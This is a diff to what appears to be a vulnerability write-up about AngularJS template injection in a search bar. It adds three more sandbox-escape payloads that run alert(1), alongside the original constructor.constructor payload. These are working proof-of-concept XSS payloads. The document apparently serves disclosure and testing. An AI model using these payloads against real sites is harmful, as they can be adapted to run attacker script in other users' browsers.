@@ -7,6 +7,11 @@ Payload in Search bar :-
 
 ```html
 {{constructor.constructor('alert(1)')()}}
+
+# Other payloads that works
+{{$on.constructor('alert(1)')()}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
 ```
 
 ![image](https://user-images.githubusercontent.com/60841283/153716154-2e31496d-6588-4f04-afe8-4fa4199ae65b.png)
